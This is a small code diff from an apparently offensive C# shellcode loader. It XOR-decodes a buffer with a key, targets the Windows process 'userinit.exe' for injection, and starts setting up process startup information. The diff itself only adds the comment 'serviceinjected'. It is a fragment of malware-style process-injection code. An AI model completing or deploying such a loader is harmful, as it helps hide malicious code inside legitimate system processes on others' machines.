@@ -154,7 +154,7 @@ public class Program
         royan = xor(sc, Encoding.ASCII.GetBytes(key));
             
         var prajwal = royan;
-        string binary = "userinit.exe";
+        string binary = "userinit.exe";  //serviceinjected
 
         Int32 size = prajwal.Length;
         StartupInfo sInfo = new StartupInfo();
